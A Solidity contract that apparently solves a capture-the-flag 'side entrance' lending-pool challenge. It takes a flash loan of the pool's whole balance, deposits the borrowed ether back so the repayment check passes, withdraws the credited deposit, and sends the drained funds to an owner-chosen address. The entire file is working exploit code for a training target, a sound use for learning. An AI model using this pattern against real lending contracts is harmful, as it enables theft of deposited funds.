// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {IFlashLoanEtherReceiver} from "../../src/side-entrance/SideEntranceLenderPool.sol";
import {Receiver} from "solady/accounts/Receiver.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
import {console} from "forge-std/console.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}
contract SideEntranceReceiver is IFlashLoanEtherReceiver, Receiver, Ownable{
    ISideEntranceLenderPool private immutable pool;
    constructor(address pool_) Ownable(msg.sender){
        pool = ISideEntranceLenderPool(pool_);
    }
    function flashLoan(address to) external onlyOwner{
        require(address (this).balance == 0, 'receiver not zero');

        uint256 amount = address (pool).balance;
        pool.flashLoan(amount);
        pool.withdraw();
        require(address (pool).balance == 0, 'pool not zero');
        require(address (this).balance == amount, 'receiver not get all eth of pool');
        SafeTransferLib.safeTransferAllETH(to);
    }
    function execute() external payable{
        require(msg.sender == address (pool));
        pool.deposit{value:address (this).balance}();
    }

}
